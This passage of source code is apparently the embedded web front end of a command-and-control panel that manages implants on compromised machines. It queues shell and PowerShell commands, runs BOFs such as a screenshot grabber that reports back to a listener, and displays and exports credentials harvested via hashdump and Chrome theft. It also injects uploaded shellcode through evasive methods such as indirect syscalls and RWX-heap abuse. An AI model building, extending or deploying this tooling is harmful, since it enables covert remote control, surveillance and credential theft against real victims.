    <div class="detail-item"><div class="detail-label">pid</div><div class="detail-value">${currentImplant.pid}</div></div>
    <div class="detail-item"><div class="detail-label">process</div><div class="detail-value">${currentImplant.process}</div></div>
    <div class="detail-item"><div class="detail-label">sleep</div><div class="detail-value">${currentImplant.sleep}s (${currentImplant.jitter}% jitter)</div></div>
  ` + "`" + `;
  
  await loadImplantTasks(id);
  document.getElementById('detailPanel').classList.add('open');
}

async function loadImplantTasks(id) {
  const tasks = await api('/implants/' + id + '/tasks') || [];
  const list = document.getElementById('taskList');
  
  if (tasks.length === 0) {
    list.innerHTML = '<div class="empty-state">no tasks</div>';
    return;
  }
  
  list.innerHTML = tasks.map(t => ` + "`" + `
    <div class="task-item">
      <div class="task-header">
        <span class="task-type"><span class="status ${t.status}"></span>${t.type}</span>
        <span class="task-time">${formatTime(t.created)}</span>
      </div>
      ${t.output ? ` + "`" + `<div class="task-output">${formatOutput(t.output, t.type)}</div>` + "`" + ` : ''}
      ${t.error ? ` + "`" + `<div class="task-output task-error">${escapeHtml(t.error)}</div>` + "`" + ` : ''}
    </div>
  ` + "`" + `).join('');
}

function closeDetail() {
  document.getElementById('detailPanel').classList.remove('open');
  currentImplant = null;
}

function toggleSelectAll(checkbox) {
  const checkboxes = document.querySelectorAll('.implant-checkbox:not([disabled])');
  checkboxes.forEach(cb => cb.checked = checkbox.checked);
  updateBulkSelection();
}

function updateBulkSelection() {
  const checked = document.querySelectorAll('.implant-checkbox:checked');
  const count = checked.length;
  document.getElementById('selectedCount').textContent = count;
  document.getElementById('bulkActions').style.display = count > 0 ? 'flex' : 'none';
  
  // Update select-all checkbox state
  const allCheckboxes = document.querySelectorAll('.implant-checkbox:not([disabled])');
  const selectAll = document.getElementById('selectAllImplants');
  if (allCheckboxes.length === 0) {
    selectAll.checked = false;
    selectAll.indeterminate = false;
  } else if (count === 0) {
    selectAll.checked = false;
    selectAll.indeterminate = false;
  } else if (count === allCheckboxes.length) {
    selectAll.checked = true;
    selectAll.indeterminate = false;
  } else {
    selectAll.checked = false;
    selectAll.indeterminate = true;
  }
}

async function executeBulkCommand() {
  const checked = document.querySelectorAll('.implant-checkbox:checked');
  if (checked.length === 0) {
    toast('no implants selected', 'error');
    return;
  }
  
  const type = document.getElementById('bulkCommandType').value;
  const args = document.getElementById('bulkCommandArgs').value.trim();
  
  let successCount = 0;
  for (const cb of checked) {
    const id = cb.dataset.id;
    try {
      await apiPost('/implants/' + id + '/tasks', {
        type: type,
        args: args ? [args] : []
      });
      successCount++;
    } catch (e) {
      console.error('Failed to queue task for ' + id, e);
    }
  }
  
  document.getElementById('bulkCommandArgs').value = '';
  toast('queued ' + type + ' on ' + successCount + ' implants', 'success');
  
  // Uncheck all
  checked.forEach(cb => cb.checked = false);
  document.getElementById('selectAllImplants').checked = false;
  updateBulkSelection();
}

async function clearImplants() {
  if (!confirm('clear all implants and their task history?')) return;
  await apiDelete('/implants');
  closeDetail();
  loadImplants();
  toast('all implants cleared', 'success');
}

async function sendCommand() {
  if (!currentImplant) return;
  
  const type = document.getElementById('commandType').value;
  const args = document.getElementById('commandArgs').value.trim();
  
  if (type === 'screenshot') {
    await executeScreenshot();
    return;
  }
  
  let taskArgs = args ? [args] : [];
  
  if (type === 'sleep' && args) {
    const parts = args.split(/\s+/);
    taskArgs = parts.map(p => p.replace('%', ''));
  }
  
  await apiPost('/implants/' + currentImplant.id + '/tasks', {
    type: type,
    args: taskArgs
  });
  
  document.getElementById('commandArgs').value = '';
  toast('task queued: ' + type, 'success');
  setTimeout(() => loadImplantTasks(currentImplant.id), 500);
}

async function executeScreenshot() {
  if (!currentImplant) return;
  
  const bofData = await api('/bofs/screenshot.x64.o');
  if (!bofData || !bofData.data) {
    toast('screenshot bof not found (screenshot.x64.o)', 'error');
    return;
  }
  
  const argsStr = document.getElementById('commandArgs').value.trim();
  if (!argsStr) {
    toast('no args - select screenshot to auto-fill', 'error');
    return;
  }
  
  const bofArgs = argsStr.split(/\s+/);
  const taskArgs = ['{}', ...bofArgs];
  
  await fetch('/api/implants/' + currentImplant.id + '/tasks', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({
      type: 'bof',
      args: taskArgs,
      data: bofData.data
    })
  });
  
  document.getElementById('commandArgs').value = '';
  toast('screenshot task queued', 'success');
  setTimeout(() => loadImplantTasks(currentImplant.id), 500);
}


async function loadListeners() {
  const listeners = await api('/listeners') || [];
  document.getElementById('listenerCount').textContent = listeners.length;
  
  const tbody = document.getElementById('listenersTable');
  if (listeners.length === 0) {
    tbody.innerHTML = '<tr><td colspan="5" style="text-align:center;color:var(--text-dim);padding:40px"><div style="margin-bottom:8px">no listeners configured</div><div style="font-size:10px">click "+ new listener" to create one</div></td></tr>';
    return;
  }
  
  tbody.innerHTML = listeners.map(l => {
    const listenerUrl = 'http://' + (l.host === '0.0.0.0' ? window.location.hostname : l.host) + ':' + l.port;
    return ` + "`" + `
    <tr>
      <td><span class="badge ${l.active ? 'active' : ''}">${l.active ? 'active' : 'stopped'}</span></td>
      <td>${l.name}</td>
      <td>${l.type}</td>
      <td>
        <span style="cursor:pointer" onclick="copyToClipboard('${listenerUrl}', this)" title="click to copy url">
          ${l.host}:${l.port}
          <span style="color:var(--text-dim);font-size:10px;margin-left:4px">[copy]</span>
        </span>
      </td>
      <td>
        ${l.active 
          ? ` + "`" + `<button class="action-btn danger" onclick="stopListener('${l.id}')">stop</button>` + "`" + `
          : ` + "`" + `<button class="action-btn success" onclick="startListener('${l.id}')">start</button>` + "`" + `}
        <button class="action-btn danger" onclick="deleteListener('${l.id}')">delete</button>
      </td>
    </tr>
  ` + "`" + `}).join('');
}

function showNewListenerModal() {
  document.getElementById('newListenerModal').classList.add('open');
}

function closeNewListenerModal() {
  document.getElementById('newListenerModal').classList.remove('open');
}

async function createListener() {
  const name = document.getElementById('listenerName').value;
  await apiPost('/listeners', {
    name: name,
    type: document.getElementById('listenerType').value,
    host: document.getElementById('listenerHost').value,
    port: parseInt(document.getElementById('listenerPort').value)
  });
  closeNewListenerModal();
  loadListeners();
  toast('listener created: ' + name, 'success');
}

async function startListener(id) {
  await apiPost('/listeners/' + id + '/start', {});
  loadListeners();
  toast('listener started', 'success');
}

async function stopListener(id) {
  await apiPost('/listeners/' + id + '/stop', {});
  loadListeners();
  toast('listener stopped', 'warning');
}

async function deleteListener(id) {
  if (!confirm('delete this listener?')) return;
  await apiDelete('/listeners/' + id);
  loadListeners();
  toast('listener deleted', 'success');
}

// credentials
let allCredentials = [];

async function exportCredentials() {
  if (allCredentials.length === 0) {
    toast('no credentials to export', 'warning');
    return;
  }
  const csv = 'source,domain,username,secret,type\n' + 
    allCredentials.map(c => 
      [c.source, c.domain || '', c.username, c.secret, c.type]
        .map(v => '"' + String(v).replace(/"/g, '""') + '"')
        .join(',')
    ).join('\n');
  downloadFile('credentials.csv', csv, 'text/csv');
  toast('exported ' + allCredentials.length + ' credentials', 'success');
}

function downloadFile(filename, content, mimeType) {
  const blob = new Blob([content], {type: mimeType});
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = url;
  a.download = filename;
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);
  URL.revokeObjectURL(url);
}

async function loadCredentials() {
  allCredentials = await api('/credentials') || [];
  const creds = allCredentials;
  const tbody = document.getElementById('credentialsTable');
  
  if (creds.length === 0) {
    tbody.innerHTML = '<tr><td colspan="5" style="text-align:center;color:var(--text-dim);padding:40px"><div style="margin-bottom:8px">no credentials harvested</div><div style="font-size:10px">run hashdump or chrome on an implant</div></td></tr>';
    return;
  }
  
  tbody.innerHTML = creds.map(c => ` + "`" + `
    <tr>
      <td>${c.source}</td>
      <td>${c.domain || '-'}</td>
      <td>${c.username}</td>
      <td class="truncate" title="${escapeHtml(c.secret)}" style="cursor:pointer" onclick="copyToClipboard('${escapeHtml(c.secret).replace(/'/g, "\\'")}', this)">${c.secret}</td>
      <td>${c.type}</td>
    </tr>
  ` + "`" + `).join('');
}

// screenshots
async function loadScreenshots() {
  const screenshots = await api('/screenshots') || [];
  const grid = document.getElementById('screenshotGrid');
  
  if (screenshots.length === 0) {
    grid.innerHTML = '<div class="empty-state"><div class="empty-state-icon">--</div>no screenshots yet</div>';
    return;
  }
  
  grid.innerHTML = screenshots.map(s => ` + "`" + `
    <div class="screenshot-card" onclick="viewScreenshot('${s.id}')">
      <img class="screenshot-img" src="/api/screenshots/${s.id}" alt="${s.name}" loading="lazy">
      <div class="screenshot-info">
        <div class="screenshot-name">${s.name}</div>
        <div class="screenshot-meta">${formatTime(s.created)}</div>
      </div>
    </div>
  ` + "`" + `).join('');
}

function viewScreenshot(id) {
  document.getElementById('screenshotModalImg').src = '/api/screenshots/' + id;
  document.getElementById('screenshotModal').classList.add('open');
}

function closeScreenshotModal() {
  document.getElementById('screenshotModal').classList.remove('open');
}

// results
let chromeResults = [];

async function exportChromeResults() {
  if (chromeResults.length === 0) {
    toast('no chrome results to export', 'warning');
    return;
  }
  const exportData = chromeResults.map(t => {
    try {
      return JSON.parse(atob(t.output));
    } catch (e) {
      return {error: 'decode failed', task_id: t.id};
    }
  });
  const json = JSON.stringify(exportData, null, 2);
  downloadFile('chrome_results.json', json, 'application/json');
  toast('exported ' + chromeResults.length + ' chrome results', 'success');
}

async function loadAllResults() {
  const implants = await api('/implants') || [];
  let allTasks = [];
  
  for (const implant of implants) {
    const tasks = await api('/implants/' + implant.id + '/tasks') || [];
    tasks.forEach(t => t.implant = implant);
    allTasks = allTasks.concat(tasks.filter(t => t.status === 'complete' || t.status === 'error'));
  }
  
  allTasks.sort((a, b) => new Date(b.created) - new Date(a.created));
  
  chromeResults = allTasks.filter(t => t.type === 'chrome' && t.output);
  
  renderResults('allResultsList', allTasks);
  renderResults('hashdumpResultsList', allTasks.filter(t => t.type === 'hashdump'));
  renderResults('chromeResultsList', chromeResults);
  renderResults('shellResultsList', allTasks.filter(t => t.type === 'shell' || t.type === 'powershell'));
  renderResults('bofResultsList', allTasks.filter(t => t.type === 'bof'));
}

function renderResults(containerId, tasks) {
  const container = document.getElementById(containerId);
  
  if (tasks.length === 0) {
    container.innerHTML = '<div class="empty-state"><div class="empty-state-icon">--</div><div>no results yet</div><div style="font-size:10px;color:var(--text-dim);margin-top:8px">execute tasks on implants to see output</div></div>';
    return;
  }
  
  container.innerHTML = tasks.map(t => ` + "`" + `
    <div class="task-item">
      <div class="task-header">
        <span class="task-type">
          <span class="status ${t.status}"></span>
          ${t.type} - ${t.implant ? t.implant.hostname : 'unknown'}
        </span>
        <span class="task-time">${formatTime(t.created)}</span>
      </div>
      ${t.output ? ` + "`" + `<div class="task-output">${formatOutput(t.output, t.type)}</div>` + "`" + ` : ''}
      ${t.error ? ` + "`" + `<div class="task-output task-error">${escapeHtml(t.error)}</div>` + "`" + ` : ''}
    </div>
  ` + "`" + `).join('');
}

// toast notifications
function toast(message, type = 'info') {
  const container = document.getElementById('toastContainer');
  const t = document.createElement('div');
  t.className = 'toast ' + type;
  t.textContent = message;
  container.appendChild(t);
  setTimeout(() => {
    t.style.animation = 'slideOut 0.3s ease forwards';
    setTimeout(() => t.remove(), 300);
  }, 3000);
}

// utils
function formatTime(ts) {
  if (!ts) return '-';
  const d = new Date(ts);
  const now = Date.now();
  const diff = now - d.getTime();
  
  if (diff < 0) return 'just now';
  if (diff < 60000) return Math.floor(diff / 1000) + 's ago';
  if (diff < 3600000) return Math.floor(diff / 60000) + 'm ago';
  if (diff < 86400000) return Math.floor(diff / 3600000) + 'h ago';
  if (diff < 604800000) return Math.floor(diff / 86400000) + 'd ago';
  return d.toLocaleDateString('en-US', {month: 'short', day: 'numeric'});
}

function escapeHtml(text) {
  const div = document.createElement('div');
  div.textContent = text;
  return div.innerHTML;
}

function highlightJson(str) {
  if (!str) return '';
  const trimmed = str.trim();
  if (!trimmed.startsWith('{') && !trimmed.startsWith('[')) {
    return escapeHtml(str);
  }
  try {
    const obj = JSON.parse(str);
    return syntaxHighlight(JSON.stringify(obj, null, 2));
  } catch (e) {
    return escapeHtml(str);
  }
}

function syntaxHighlight(json) {
  json = json.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
  return json.replace(/("(\\u[a-zA-Z0-9]{4}|\\[^u]|[^\\"])*"(\s*:)?|\b(true|false|null)\b|-?\d+(?:\.\d*)?(?:[eE][+\-]?\d+)?)/g, function (match) {
    let cls = 'json-number';
    if (/^"/.test(match)) {
      if (/:$/.test(match)) {
        cls = 'json-key';
      } else {
        cls = 'json-string';
      }
    } else if (/true|false/.test(match)) {
      cls = 'json-bool';
    } else if (/null/.test(match)) {
      cls = 'json-null';
    }
    return '<span class="' + cls + '">' + match + '</span>';
  });
}

function formatOutput(b64, taskType) {
  if (!b64) return '';
  try {
    const decoded = atob(b64);
    if (taskType === 'chrome') {
      return highlightJson(decoded);
    }
    return escapeHtml(decoded);
  } catch (e) {
    return '[decode error: ' + e.message + ']';
  }
}

function decodeOutput(b64) {
  if (!b64) return '';
  try {
    return atob(b64);
  } catch (e) {
    console.error('Failed to decode base64:', e);
    return '[decode error: ' + e.message + ']';
  }
}

// bofs
let allBOFs = [];
let selectedBOF = null;

async function loadBOFs() {
  allBOFs = await api('/bofs') || [];
  renderBOFs(allBOFs);
  updateBofImplantSelect();
}

function renderBOFs(bofs) {
  const list = document.getElementById('bofList');
  if (bofs.length === 0) {
    list.innerHTML = '<div class="empty-state" style="padding:20px;text-align:center"><div style="margin-bottom:8px">no BOFs found</div><div style="font-size:10px;color:var(--text-dim)">place .o files in build/BOFs/</div></div>';
    return;
  }
  
  list.innerHTML = bofs.map(b => ` + "`" + `
    <div class="bof-item ${selectedBOF === b.name ? 'selected' : ''}" onclick="selectBOF('${b.name}')">
      <span class="bof-name">${b.name}</span>
      <span class="bof-size">${formatSize(b.size)}</span>
    </div>
  ` + "`" + `).join('');
}

function filterBOFs() {
  const search = document.getElementById('bofSearch').value.toLowerCase();
  const filtered = allBOFs.filter(b => b.name.toLowerCase().includes(search));
  renderBOFs(filtered);
}

async function selectBOF(name) {
  selectedBOF = name;
  document.getElementById('selectedBof').value = name;
  renderBOFs(allBOFs.filter(b => {
    const search = document.getElementById('bofSearch').value.toLowerCase();
    return b.name.toLowerCase().includes(search);
  }));
  
  // Auto-fill args for screenshot BOF
  const argsInput = document.getElementById('bofArgs');
  if (name.toLowerCase().includes('screenshot')) {
    const listeners = await api('/listeners') || [];
    const activeListener = listeners.find(l => l.active);
    if (activeListener) {
      let serverHost = activeListener.host;
      if (serverHost === '0.0.0.0' || serverHost === '127.0.0.1') {
        serverHost = window.location.hostname;
      }
      argsInput.value = 'z' + serverHost + ':' + activeListener.port + ' i0 i0 i70 i100';
      argsInput.placeholder = 'zurl:port iPid iGrayscale iQuality iScale';
    } else {
      argsInput.placeholder = 'start a listener first for screenshot';
    }
  } else {
    argsInput.value = '';
    argsInput.placeholder = 'arg1 arg2 ... (prefix: z=str i=int s=short b=hex)';
  }
}

async function updateBofImplantSelect() {
  const implants = await api('/implants') || [];
  const select = document.getElementById('bofTargetImplant');
  const currentValue = select.value;
  
  implants.forEach(i => { i.alive = isImplantAlive(i); });
  
  select.innerHTML = '<option value="">select implant...</option>' + 
    implants.map(i => 
      ` + "`" + `<option value="${i.id}" ${i.alive ? '' : 'disabled style="color:var(--text-dim)"'}>${i.hostname} (${i.username})${i.alive ? '' : ' [dead]'}</option>` + "`" + `
    ).join('');
  
  // Clear selection if implant died
  if (currentValue) {
    const implant = implants.find(i => i.id === currentValue);
    if (implant && implant.alive) {
      select.value = currentValue;
    } else {
      select.value = '';
    }
  }
}

async function executeBOF() {
  if (!selectedBOF) {
    toast('please select a bof', 'error');
    return;
  }
  
  const implantId = document.getElementById('bofTargetImplant').value;
  if (!implantId) {
    toast('please select a target implant', 'error');
    return;
  }
  
  const bofData = await api('/bofs/' + selectedBOF);
  if (!bofData || !bofData.data) {
    toast('failed to load bof data', 'error');
    return;
  }
  
  const argsStr = document.getElementById('bofArgs').value.trim();
  // First arg is JSON metadata (empty for inline BOF), rest are BOF args
  // Split space-separated args and prepend empty JSON object
  const bofArgs = argsStr ? argsStr.split(/\s+/) : [];
  const taskArgs = ['{}', ...bofArgs]; // Empty JSON metadata + BOF args
  
  await fetch('/api/implants/' + implantId + '/tasks', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({
      type: 'bof',
      args: taskArgs,
      data: bofData.data
    })
  });
  
  document.getElementById('bofArgs').value = '';
  toast('bof queued: ' + selectedBOF, 'success');
}

function formatSize(bytes) {
  if (bytes < 1024) return bytes + ' B';
  if (bytes < 1024 * 1024) return (bytes / 1024).toFixed(1) + ' KB';
  return (bytes / (1024 * 1024)).toFixed(1) + ' MB';
}

// shellcode
let shellcodeBytes = null;

async function updateShellcodeImplantSelect() {
  const implants = await api('/implants') || [];
  const select = document.getElementById('shellcodeTargetImplant');
  const currentValue = select.value;
  
  implants.forEach(i => { i.alive = isImplantAlive(i); });
  
  select.innerHTML = '<option value="">select implant...</option>' + 
    implants.map(i => 
      ` + "`" + `<option value="${i.id}" ${i.alive ? '' : 'disabled style="color:var(--text-dim)"'}>${i.hostname} (${i.username})${i.alive ? '' : ' [dead]'}</option>` + "`" + `
    ).join('');
  
  // Clear selection if implant died
  if (currentValue) {
    const implant = implants.find(i => i.id === currentValue);
    if (implant && implant.alive) {
      select.value = currentValue;
    } else {
      select.value = '';
    }
  }
}

function handleShellcodeFile(event) {
  const file = event.target.files[0];
  if (!file) return;
  
  const reader = new FileReader();
  reader.onload = function(e) {
    shellcodeBytes = new Uint8Array(e.target.result);
    document.getElementById('shellcodeData').value = '';
    document.getElementById('shellcodeInfo').innerHTML = ` + "`" + `<span style="color:var(--success)">[ok]</span> ${file.name} - ${shellcodeBytes.length} bytes` + "`" + `;
  };
  reader.readAsArrayBuffer(file);
}

function detectShellcodeFormat() {
  const input = document.getElementById('shellcodeData').value.trim();
  const info = document.getElementById('shellcodeInfo');
  
  if (!input) {
    if (shellcodeBytes) {
      return;
    }
    info.textContent = 'no shellcode loaded';
    return;
  }
  
  shellcodeBytes = null;
  const bytes = parseShellcodeInput();
  
  if (bytes && bytes.length > 0) {
    let format = 'unknown';
    if (input.includes('\\x')) format = '\\x hex';
    else if (input.includes('0x')) format = '0x array';
    else if (/^[0-9a-fA-F\s]+$/.test(input)) format = 'raw hex';
    else format = 'base64';
    
    info.innerHTML = ` + "`" + `<span style="color:var(--success)">[ok]</span> detected ${format} - ${bytes.length} bytes` + "`" + `;
  } else {
    info.innerHTML = ` + "`" + `<span style="color:var(--error)">[error]</span> invalid format` + "`" + `;
  }
}

function parseShellcodeInput() {
  const input = document.getElementById('shellcodeData').value.trim();
  if (!input) return shellcodeBytes;
  
  // Try hex first (remove spaces, 0x prefixes, \x)
  let hex = input.replace(/\\x/g, '').replace(/0x/g, '').replace(/\s/g, '');
  if (/^[0-9a-fA-F]+$/.test(hex) && hex.length % 2 === 0) {
    const bytes = new Uint8Array(hex.length / 2);
    for (let i = 0; i < hex.length; i += 2) {
      bytes[i / 2] = parseInt(hex.substr(i, 2), 16);
    }
    return bytes;
  }
  
  // Try base64
  try {
    const binary = atob(input);
    const bytes = new Uint8Array(binary.length);
    for (let i = 0; i < binary.length; i++) {
      bytes[i] = binary.charCodeAt(i);
    }
    return bytes;
  } catch (e) {}
  
  return null;
}

async function executeShellcode() {
  const bytes = parseShellcodeInput();
  if (!bytes || bytes.length === 0) {
    toast('please upload a shellcode file or paste shellcode data', 'error');
    return;
  }
  
  const implantId = document.getElementById('shellcodeTargetImplant').value;
  if (!implantId) {
    toast('please select a target implant', 'error');
    return;
  }
  
  const method = document.getElementById('shellcodeMethod').value;
  
  // Convert to base64
  let binary = '';
  for (let i = 0; i < bytes.length; i++) {
    binary += String.fromCharCode(bytes[i]);
  }
  const b64 = btoa(binary);
  
  await fetch('/api/implants/' + implantId + '/tasks', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({
      type: 'execute',
      args: [JSON.stringify({method: method})],
      data: b64
    })
  });
  
  toast(` + "`" + `shellcode queued (${bytes.length} bytes, ${method})` + "`" + `, 'success');
}

// Update method description on change
document.addEventListener('DOMContentLoaded', function() {
  const methodSelect = document.getElementById('shellcodeMethod');
  if (methodSelect) {
    methodSelect.addEventListener('change', function() {
      const desc = document.getElementById('methodDesc');
      switch (this.value) {
        case 'indirect':
          desc.innerHTML = 'ntallocatevirtualmemory + rtlcreateuserthread via indirect syscalls. <span style="color:var(--success)">recommended</span> for most scenarios.';
          break;
        case 'enclave':
          desc.innerHTML = 'abuses mscoree.dll rwx heap + ldrcallenclave. <span style="color:var(--warning)">stealthier</span> but requires .net runtime.';
          break;
        case 'once':
          desc.innerHTML = 'rtlrunonceexecuteonce callback. <span style="color:var(--error)">[sync]</span> - shellcode must return, do not use exit payloads!';
          break;
      }
    });
  }
});

// enter key for login
document.getElementById('password').addEventListener('keypress', e => {
  if (e.key === 'Enter') login();
});

document.getElementById('commandArgs').addEventListener('keypress', e => {
  if (e.key === 'Enter') sendCommand();
});

document.getElementById('commandType').addEventListener('change', async function() {
  const argsInput = document.getElementById('commandArgs');
  switch (this.value) {
    case 'screenshot':
      const listeners = await api('/listeners') || [];
      const activeListener = listeners.find(l => l.active);
      if (activeListener) {
        let serverHost = activeListener.host;
        if (serverHost === '0.0.0.0' || serverHost === '127.0.0.1') {
          serverHost = window.location.hostname;
        }
        argsInput.value = 'z' + serverHost + ':' + activeListener.port + ' i0 i0 i70 i100';
        argsInput.placeholder = 'zurl:port iPid iGrayscale iQuality iScale';
      } else {
        argsInput.placeholder = 'start a listener first';
      }
      break;
    case 'shell':
    case 'powershell':
      argsInput.value = '';
      argsInput.placeholder = 'command to execute';
      break;
    case 'ls':
    case 'cd':
    case 'cat':
      argsInput.value = '';
      argsInput.placeholder = 'path';
      break;
    case 'bof':
      argsInput.value = '';
      argsInput.placeholder = 'use bofs page instead';
      break;
    case 'sleep':
      argsInput.value = '';
      argsInput.placeholder = 'seconds [jitter%] (e.g. 10 20)';
      break;
    default:
      argsInput.value = '';
      argsInput.placeholder = 'arguments (optional)';
  }
});

// keyboard shortcuts
document.addEventListener('keydown', e => {
  if (e.key === 'Escape') {
    closeDetail();
    closeNewListenerModal();
    closeScreenshotModal();
  }
});

// copy to clipboard
function copyToClipboard(text, btn) {
  navigator.clipboard.writeText(text).then(() => {
    const orig = btn.textContent;
    btn.textContent = 'copied!';
    setTimeout(() => btn.textContent = orig, 1000);
  });
}

// init
checkAuth();
</script>
</body>
</html>`
}

